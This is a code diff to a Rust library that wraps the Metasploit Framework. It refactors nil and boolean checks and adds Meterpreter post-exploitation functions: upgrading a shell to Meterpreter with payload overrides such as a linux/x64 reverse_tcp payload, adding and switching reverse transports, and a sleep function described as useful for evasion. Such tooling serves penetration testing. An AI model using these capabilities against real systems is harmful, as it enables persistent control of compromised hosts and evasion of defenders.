@@ -7,7 +7,7 @@
 use crate::error::{AssassinateError, Result};
 use crate::ruby_bridge::{
     call_bool_with_str, call_method, call_str_with_str, call_strings_with_str, call_void_with_str,
-    get_i64_attr, get_string_attr, is_nil, to_ruby_str, value_to_bool, value_to_string,
+    get_i64_attr, get_string_attr, to_ruby_str, value_to_string,
 };
 use magnus::{value::ReprValue, TryConvert, Value};
 
@@ -41,7 +41,7 @@ impl SessionManager {
         let session_val = call_method(self.ruby_sessions, "[]", &[id_val])?;
 
         // Check if nil
-        if is_nil(session_val) {
+        if session_val.is_nil() {
             Ok(None)
         } else {
             Ok(Some(Session {
@@ -63,7 +63,7 @@ impl SessionManager {
         let result_val = call_method(self.ruby_sessions, "delete", &[id_val])?;
 
         // If delete returns nil, session didn't exist
-        Ok(!is_nil(result_val))
+        Ok(!result_val.is_nil())
     }
 
     /// Get a session by ID (raw version without PyO3)
@@ -77,7 +77,7 @@ impl SessionManager {
         let session_val = call_method(self.ruby_sessions, "[]", &[id_val])?;
 
         // Check if nil
-        if is_nil(session_val) {
+        if session_val.is_nil() {
             Ok(None)
         } else {
             Ok(Some(session_val))
@@ -122,7 +122,7 @@ impl SessionManager {
         // Create the socket connection
         let socket = call_method(rex_socket_tcp, "create", &[opts])?;
 
-        if is_nil(socket) {
+        if socket.is_nil() {
             return Err(AssassinateError::RubyError(format!(
                 "Failed to connect to {}:{}",
                 host, port
@@ -139,7 +139,7 @@ impl SessionManager {
         // Create CommandShell session from socket
         let session = call_method(cmd_shell_class, "new", &[socket])?;
 
-        if is_nil(session) {
+        if session.is_nil() {
             return Err(AssassinateError::RubyError(
                 "Failed to create CommandShell session".to_string(),
             ));
@@ -230,7 +230,7 @@ impl Session {
             call_method(self.ruby_session, "read", &[])?
         };
 
-        if is_nil(result) {
+        if result.is_nil() {
             Ok(String::new())
         } else {
             Ok(value_to_string(result)?)
@@ -259,7 +259,7 @@ impl Session {
 
         let result = call_method(self.ruby_session, "run_cmd", &[cmd_val])?;
 
-        if is_nil(result) {
+        if result.is_nil() {
             Ok(String::new())
         } else {
             Ok(value_to_string(result)?)
@@ -325,7 +325,7 @@ impl Session {
     pub fn shell_read(&self) -> Result<String> {
         let result = call_method(self.ruby_session, "shell_read", &[])?;
 
-        if is_nil(result) {
+        if result.is_nil() {
             Ok(String::new())
         } else {
             Ok(value_to_string(result)?)
@@ -350,13 +350,47 @@ impl Session {
     /// Upgrade shell session to Meterpreter
     /// This runs the post/multi/manage/shell_to_meterpreter module
     /// Only works for command shell sessions
-    pub fn shell_to_meterpreter(&self, lhost: &str, lport: u16) -> Result<bool> {
+    ///
+    /// # Arguments
+    /// * `lhost` - Local host for reverse connection
+    /// * `lport` - Local port for reverse connection
+    /// * `extra_options` - Optional additional MSF options (e.g., PAYLOAD_OVERRIDE, PLATFORM_OVERRIDE)
+    ///
+    /// # Advanced Options (can be passed via extra_options)
+    /// * `PAYLOAD_OVERRIDE` - Override the auto-detected payload (e.g., "linux/x64/meterpreter/reverse_tcp")
+    /// * `PLATFORM_OVERRIDE` - Override the detected platform (e.g., "linux", "windows")
+    /// * `PSH_ARCH_OVERRIDE` - PowerShell architecture for Windows ("x64" or "x86")
+    /// * `WIN_TRANSFER` - Transfer method for Windows ("POWERSHELL" or "VBS")
+    /// * `HANDLE_TIMEOUT` - Timeout in seconds waiting for session (default 30)
+    ///
+    /// # Notes on x86/x64 on Linux
+    /// MSF's shell_to_meterpreter has a bug where regex /86/ matches both "x86" and "x86_64",
+    /// always using x86 payload. To get x64 Meterpreter on Linux:
+    /// ```
+    /// extra_options.insert("PAYLOAD_OVERRIDE", "linux/x64/meterpreter/reverse_tcp");
+    /// extra_options.insert("PLATFORM_OVERRIDE", "linux");
+    /// ```
+    /// This is important because x86/linux Meterpreter has limited functionality
+    /// (transport operations are not supported).
+    pub fn shell_to_meterpreter(
+        &self,
+        lhost: &str,
+        lport: u16,
+        extra_options: Option<std::collections::HashMap<String, String>>,
+    ) -> Result<bool> {
         // Use run_post_module which properly handles module creation and options
         // HANDLER=true tells the module to start its own handler
         let mut options = std::collections::HashMap::new();
         options.insert("LHOST".to_string(), lhost.to_string());
         options.insert("LPORT".to_string(), lport.to_string());
         options.insert("HANDLER".to_string(), "true".to_string());
+
+        // Merge any extra options provided by the caller
+        if let Some(extra) = extra_options {
+            for (k, v) in extra {
+                options.insert(k, v);
+            }
+        }
 
         self.run_post_module("post/multi/manage/shell_to_meterpreter", options)
     }
@@ -410,7 +444,7 @@ impl Session {
     fn has_extension(&self, name: &str) -> Result<bool> {
         let method_name = to_ruby_str(name)?;
         let result = call_method(self.ruby_session, "respond_to?", &[method_name])?;
-        value_to_bool(result)
+        Ok(result.to_bool())
     }
 
     /// Get the core extension object for Meterpreter client core operations
@@ -483,15 +517,13 @@ impl Session {
 
         // Check type predicates
         if let Ok(is_file_val) = call_method(stat_val, "file?", &[]) {
-            if let Ok(is_file) = value_to_bool(is_file_val) {
-                stat_obj.insert("is_file".to_string(), serde_json::json!(is_file));
-            }
+            let is_file = is_file_val.to_bool();
+            stat_obj.insert("is_file".to_string(), serde_json::json!(is_file));
         }
 
         if let Ok(is_dir_val) = call_method(stat_val, "directory?", &[]) {
-            if let Ok(is_dir) = value_to_bool(is_dir_val) {
-                stat_obj.insert("is_directory".to_string(), serde_json::json!(is_dir));
-            }
+            let is_dir = is_dir_val.to_bool();
+            stat_obj.insert("is_directory".to_string(), serde_json::json!(is_dir));
         }
 
         Ok(serde_json::Value::Object(stat_obj))
@@ -590,7 +622,7 @@ impl Session {
         // Creating a new framework would result in an empty sessions collection.
         let framework = call_method(self.ruby_session, "framework", &[])?;
 
-        if is_nil(framework) {
+        if framework.is_nil() {
             return Err(AssassinateError::RubyError(
                 "Session has no framework reference - was it registered properly?".to_string(),
             ));
@@ -599,7 +631,7 @@ impl Session {
         // Get modules
         let modules = call_method(framework, "modules", &[])?;
 
-        if is_nil(modules) {
+        if modules.is_nil() {
             return Err(AssassinateError::RubyError(
                 "Framework has no modules collection".to_string(),
             ));
@@ -609,18 +641,19 @@ impl Session {
         let module_name = ruby.str_new(module_path).as_value();
         let module = call_method(modules, "create", &[module_name])?;
 
-        if is_nil(module) {
+        if module.is_nil() {
             return Err(AssassinateError::ModuleNotFound(module_path.to_string()));
         }
 
         // Set SESSION datastore option to this session's ID
         let datastore = call_method(module, "datastore", &[])?;
 
-        if is_nil(datastore) {
+        if datastore.is_nil() {
             return Err(AssassinateError::RubyError(
                 "Module has no datastore".to_string(),
             ));
         }
+
         call_method(
             datastore,
             "[]=",
@@ -648,7 +681,7 @@ impl Session {
         let _ = call_method(module, "cleanup", &[]);
 
         // Check if nil (failure) or has a value (success)
-        Ok(!is_nil(result))
+        Ok(!result.is_nil())
     }
 
     // ========== Process Management (Meterpreter) ==========
@@ -730,7 +763,7 @@ impl Session {
 
         // Extract handle
         let handle_val = call_method(process_val, "handle", &[])?;
-        let handle = if is_nil(handle_val) {
+        let handle = if handle_val.is_nil() {
             0
         } else {
             crate::ruby_bridge::value_to_i64(handle_val).unwrap_or(0)
@@ -738,7 +771,7 @@ impl Session {
 
         // Extract channel if it exists
         let channel_val = call_method(process_val, "channel", &[])?;
-        let channel_id = if is_nil(channel_val) {
+        let channel_id = if channel_val.is_nil() {
             None
         } else {
             // Get channel ID from channel object
@@ -786,7 +819,7 @@ impl Session {
     pub fn sys_getenv(&self, var_name: &str) -> Result<Option<String>> {
         let result = call_method(self.sys_config()?, "getenv", &[to_ruby_str(var_name)?])?;
 
-        if is_nil(result) {
+        if result.is_nil() {
             Ok(None)
         } else {
             Ok(Some(value_to_string(result)?))
@@ -1122,7 +1155,7 @@ impl Session {
             call_method(self.core()?, "machine_id", &[])?
         };
 
-        if is_nil(result) {
+        if result.is_nil() {
             Ok(String::new())
         } else {
             value_to_string(result)
@@ -1143,7 +1176,7 @@ impl Session {
             call_method(self.core()?, "native_arch", &[])?
         };
 
-        if is_nil(result) {
+        if result.is_nil() {
             Ok(String::new())
         } else {
             value_to_string(result)
@@ -1164,7 +1197,7 @@ impl Session {
             call_method(self.core()?, "get_session_guid", &[])?
         };
 
-        if is_nil(result) {
+        if result.is_nil() {
             Ok(String::new())
         } else {
             // GUID is returned as binary bytes, use Ruby's unpack to convert to hex
@@ -1199,13 +1232,13 @@ impl Session {
         let result = call_method(self.core()?, "secure", &[])?;
         // secure() returns a hash with :key, :type, :weak_key? keys
         // If :key is present and not nil, encryption was enabled
-        if is_nil(result) {
+        if result.is_nil() {
             return Ok(false);
         }
 
         let key_sym = crate::ruby_bridge::get_ruby()?.to_symbol("key");
         let key_val = call_method(result, "[]", &[key_sym.as_value()])?;
-        Ok(!is_nil(key_val))
+        Ok(!key_val.is_nil())
     }
 
     /// Migrate the Meterpreter to a different process
@@ -1248,6 +1281,300 @@ impl Session {
             call_method(self.core()?, "migrate", &[pid_val, nil_val, opts_hash.as_value()])?
         };
 
-        value_to_bool(result)
+        Ok(result.to_bool())
+    }
+
+    // ========== Meterpreter Transport Management ==========
+
+    /// List all transports configured for this Meterpreter session
+    ///
+    /// Returns JSON with:
+    /// - `session_exp`: Session expiration time in seconds
+    /// - `transports`: Array of transport configurations
+    ///
+    /// Each transport has: url, comm_timeout, retry_total, retry_wait, ua, proxy_host, etc.
+    /// Only works on Meterpreter sessions.
+    pub fn transport_list(&self) -> Result<serde_json::Value> {
+        let result = call_method(self.core()?, "transport_list", &[])?;
+
+        if result.is_nil() {
+            return Err(AssassinateError::RubyError(
+                "transport_list returned nil".to_string(),
+            ));
+        }
+
+        // Result is a hash with :session_exp and :transports keys
+        let ruby = crate::ruby_bridge::get_ruby()?;
+
+        // Get session_exp
+        let session_exp_sym = ruby.to_symbol("session_exp");
+        let session_exp_val = call_method(result, "[]", &[session_exp_sym.as_value()])?;
+        let session_exp = if session_exp_val.is_nil() {
+            0
+        } else {
+            crate::ruby_bridge::value_to_i64(session_exp_val).unwrap_or(0)
+        };
+
+        // Get transports array
+        let transports_sym = ruby.to_symbol("transports");
+        let transports_val = call_method(result, "[]", &[transports_sym.as_value()])?;
+
+        let mut transports = Vec::new();
+        if !transports_val.is_nil() {
+            let len = crate::ruby_bridge::ruby_array_len(transports_val)?;
+            for i in 0..len {
+                let transport = crate::ruby_bridge::ruby_array_get(transports_val, i)?;
+                let transport_json = crate::ruby_bridge::hash_to_json(transport)?;
+                transports.push(transport_json);
+            }
+        }
+
+        Ok(serde_json::json!({
+            "session_exp": session_exp,
+            "transports": transports
+        }))
+    }
+
+    /// Set transport timeouts for the currently active transport
+    ///
+    /// # Arguments
+    /// * `session_exp` - Session expiration timeout in seconds
+    /// * `comm_timeout` - Communication timeout in seconds
+    /// * `retry_total` - Total number of retries
+    /// * `retry_wait` - Wait time between retries in seconds
+    ///
+    /// Returns JSON with the updated timeout values.
+    /// Only works on Meterpreter sessions.
+    pub fn set_transport_timeouts(
+        &self,
+        session_exp: Option<i64>,
+        comm_timeout: Option<i64>,
+        retry_total: Option<i64>,
+        retry_wait: Option<i64>,
+    ) -> Result<serde_json::Value> {
+        let ruby = crate::ruby_bridge::get_ruby()?;
+
+        // Build options hash
+        let opts_hash = ruby.hash_new();
+
+        if let Some(v) = session_exp {
+            let key = ruby.to_symbol("session_exp");
+            let val = ruby.integer_from_i64(v).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+        if let Some(v) = comm_timeout {
+            let key = ruby.to_symbol("comm_timeout");
+            let val = ruby.integer_from_i64(v).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+        if let Some(v) = retry_total {
+            let key = ruby.to_symbol("retry_total");
+            let val = ruby.integer_from_i64(v).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+        if let Some(v) = retry_wait {
+            let key = ruby.to_symbol("retry_wait");
+            let val = ruby.integer_from_i64(v).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+
+        let result = call_method(self.core()?, "set_transport_timeouts", &[opts_hash.as_value()])?;
+
+        if result.is_nil() {
+            return Err(AssassinateError::RubyError(
+                "set_transport_timeouts returned nil".to_string(),
+            ));
+        }
+
+        crate::ruby_bridge::hash_to_json(result)
+    }
+
+    /// Add a new transport to the Meterpreter session
+    ///
+    /// # Arguments
+    /// * `transport` - Transport type: "reverse_tcp", "reverse_http", "reverse_https", "bind_tcp"
+    /// * `lhost` - Listening host (required for reverse transports)
+    /// * `lport` - Listening port
+    /// * `ua` - User agent string (for HTTP/HTTPS transports)
+    /// * `comm_timeout` - Communication timeout in seconds
+    /// * `session_exp` - Session expiration timeout in seconds
+    /// * `retry_total` - Total number of retries
+    /// * `retry_wait` - Wait time between retries in seconds
+    ///
+    /// Only works on Meterpreter sessions.
+    pub fn transport_add(
+        &self,
+        transport: &str,
+        lhost: Option<&str>,
+        lport: u16,
+        ua: Option<&str>,
+        comm_timeout: Option<i64>,
+        session_exp: Option<i64>,
+        retry_total: Option<i64>,
+        retry_wait: Option<i64>,
+    ) -> Result<bool> {
+        let ruby = crate::ruby_bridge::get_ruby()?;
+
+        // Build options hash
+        let opts_hash = ruby.hash_new();
+
+        // Required: transport type
+        let transport_key = ruby.to_symbol("transport");
+        let transport_val = ruby.str_new(transport).as_value();
+        call_method(opts_hash.as_value(), "[]=", &[transport_key.as_value(), transport_val])?;
+
+        // Required: lport
+        let lport_key = ruby.to_symbol("lport");
+        let lport_val = ruby.integer_from_i64(lport as i64).as_value();
+        call_method(opts_hash.as_value(), "[]=", &[lport_key.as_value(), lport_val])?;
+
+        // lhost (required for reverse transports)
+        if let Some(host) = lhost {
+            let key = ruby.to_symbol("lhost");
+            let val = ruby.str_new(host).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+
+        // Optional: User agent
+        if let Some(agent) = ua {
+            let key = ruby.to_symbol("ua");
+            let val = ruby.str_new(agent).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+
+        // Optional timeout settings
+        if let Some(v) = comm_timeout {
+            let key = ruby.to_symbol("comm_timeout");
+            let val = ruby.integer_from_i64(v).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+        if let Some(v) = session_exp {
+            let key = ruby.to_symbol("session_exp");
+            let val = ruby.integer_from_i64(v).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+        if let Some(v) = retry_total {
+            let key = ruby.to_symbol("retry_total");
+            let val = ruby.integer_from_i64(v).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+        if let Some(v) = retry_wait {
+            let key = ruby.to_symbol("retry_wait");
+            let val = ruby.integer_from_i64(v).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+
+        let result = call_method(self.core()?, "transport_add", &[opts_hash.as_value()])?;
+
+        Ok(result.to_bool())
+    }
+
+    /// Remove a transport from the Meterpreter session
+    ///
+    /// # Arguments
+    /// * `transport` - Transport type to remove
+    /// * `lhost` - Host of the transport to remove
+    /// * `lport` - Port of the transport to remove
+    ///
+    /// Only works on Meterpreter sessions.
+    pub fn transport_remove(&self, transport: &str, lhost: Option<&str>, lport: u16) -> Result<bool> {
+        let ruby = crate::ruby_bridge::get_ruby()?;
+
+        // Build options hash
+        let opts_hash = ruby.hash_new();
+
+        let transport_key = ruby.to_symbol("transport");
+        let transport_val = ruby.str_new(transport).as_value();
+        call_method(opts_hash.as_value(), "[]=", &[transport_key.as_value(), transport_val])?;
+
+        let lport_key = ruby.to_symbol("lport");
+        let lport_val = ruby.integer_from_i64(lport as i64).as_value();
+        call_method(opts_hash.as_value(), "[]=", &[lport_key.as_value(), lport_val])?;
+
+        if let Some(host) = lhost {
+            let key = ruby.to_symbol("lhost");
+            let val = ruby.str_new(host).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+
+        let result = call_method(self.core()?, "transport_remove", &[opts_hash.as_value()])?;
+
+        Ok(result.to_bool())
+    }
+
+    /// Change the active transport to a different one
+    ///
+    /// This switches the Meterpreter to use a different transport.
+    /// The new transport must already be configured.
+    ///
+    /// # Arguments
+    /// * `transport` - Transport type to switch to
+    /// * `lhost` - Host of the transport
+    /// * `lport` - Port of the transport
+    ///
+    /// Only works on Meterpreter sessions.
+    pub fn transport_change(&self, transport: &str, lhost: Option<&str>, lport: u16) -> Result<bool> {
+        let ruby = crate::ruby_bridge::get_ruby()?;
+
+        // Build options hash
+        let opts_hash = ruby.hash_new();
+
+        let transport_key = ruby.to_symbol("transport");
+        let transport_val = ruby.str_new(transport).as_value();
+        call_method(opts_hash.as_value(), "[]=", &[transport_key.as_value(), transport_val])?;
+
+        let lport_key = ruby.to_symbol("lport");
+        let lport_val = ruby.integer_from_i64(lport as i64).as_value();
+        call_method(opts_hash.as_value(), "[]=", &[lport_key.as_value(), lport_val])?;
+
+        if let Some(host) = lhost {
+            let key = ruby.to_symbol("lhost");
+            let val = ruby.str_new(host).as_value();
+            call_method(opts_hash.as_value(), "[]=", &[key.as_value(), val])?;
+        }
+
+        let result = call_method(self.core()?, "transport_change", &[opts_hash.as_value()])?;
+
+        Ok(result.to_bool())
+    }
+
+    /// Put the Meterpreter session to sleep for the specified duration
+    ///
+    /// The session will go dormant and reconnect after the specified time.
+    /// This is useful for evasion - the session stops communicating temporarily.
+    ///
+    /// # Arguments
+    /// * `seconds` - Number of seconds to sleep
+    ///
+    /// Only works on Meterpreter sessions.
+    pub fn transport_sleep(&self, seconds: u32) -> Result<bool> {
+        if seconds == 0 {
+            return Ok(false);
+        }
+
+        let ruby = crate::ruby_bridge::get_ruby()?;
+        let seconds_val = ruby.integer_from_i64(seconds as i64).as_value();
+
+        let result = call_method(self.core()?, "transport_sleep", &[seconds_val])?;
+
+        Ok(result.to_bool())
+    }
+
+    /// Switch to the next transport in the transport list
+    ///
+    /// This cycles to the next configured transport.
+    /// Only works on Meterpreter sessions.
+    pub fn transport_next(&self) -> Result<bool> {
+        let result = call_method(self.core()?, "transport_next", &[])?;
+        Ok(result.to_bool())
+    }
+
+    /// Switch to the previous transport in the transport list
+    ///
+    /// This cycles to the previous configured transport.
+    /// Only works on Meterpreter sessions.
+    pub fn transport_prev(&self) -> Result<bool> {
+        let result = call_method(self.core()?, "transport_prev", &[])?;
+        Ok(result.to_bool())
     }
 }
